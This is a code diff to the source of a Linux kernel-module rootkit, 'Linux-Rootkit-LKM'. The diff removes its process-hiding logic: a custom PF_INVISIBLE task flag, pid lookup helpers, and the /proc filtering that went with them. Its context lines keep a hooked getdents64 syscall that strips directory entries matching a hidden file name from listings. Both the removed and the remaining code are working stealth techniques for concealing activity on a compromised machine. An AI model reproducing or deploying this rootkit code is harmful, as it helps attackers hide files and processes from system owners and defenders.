@@ -27,44 +27,11 @@
 #endif
 
 #define OURMODNAME "loadable_kernel_module"
-// Custom flag stored in task_struct->flags to mark a process as rootkit-hidden.
-// Must not collide with any kernel-defined PF_* flag; verify against <linux/sched.h> on each kernel upgrade.
-#define PF_INVISIBLE 0x10000000
 
 MODULE_AUTHOR("Harry Hsu x90613@gmail.com");
 MODULE_DESCRIPTION("Linux-Rootkit-LKM");
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("1.0");
-
-static struct task_struct *find_task(pid_t pid)
-{
-	struct task_struct *p;
-	// for_each_process requires rcu_read_lock() to safely walk the task list.
-	// A task can exit and free its task_struct mid-iteration without the lock.
-	rcu_read_lock();
-	for_each_process(p) {
-		if (p->pid == pid) {
-			rcu_read_unlock();
-			return p;
-		}
-	}
-	rcu_read_unlock();
-	return NULL;
-}
-
-static int is_invisible(pid_t pid)
-{
-	struct task_struct *task;
-
-	if (!pid)
-		return 0;
-	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & PF_INVISIBLE)
-		return 1;
-	return 0;
-}
 
 static int change_process_name(const char *orig_name, const char *new_name)
 {
@@ -212,18 +179,16 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	// be freed/reassigned by a concurrent IOCTL_FILE_HIDE until we're done.
 	mutex_lock(&hidden_file_lock);
 	while (off < ret) {
-		bool name_match, pid_match;
+		bool name_match;
 
 		dir = (void *)kdirent + off;
 		// Guard against malformed dirents with d_reclen == 0; advancing by zero loops forever.
 		if (dir->d_reclen == 0)
 			break;
-		// Hide the entry if: (not in /proc) and its name matches hidden_file,
-		// OR (in /proc) and the entry's numeric name is a PF_INVISIBLE pid.
+		// Hide the entry if it's not in /proc and its name matches hidden_file.
 		name_match = !proc && hidden_file && *hidden_file != '\0' &&
 			memcmp(hidden_file, dir->d_name, strlen(hidden_file)) == 0;
-		pid_match = proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10));
-		if (name_match || pid_match) {
+		if (name_match) {
 			// First entry: shift remaining dirents left over it, shrink ret.
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
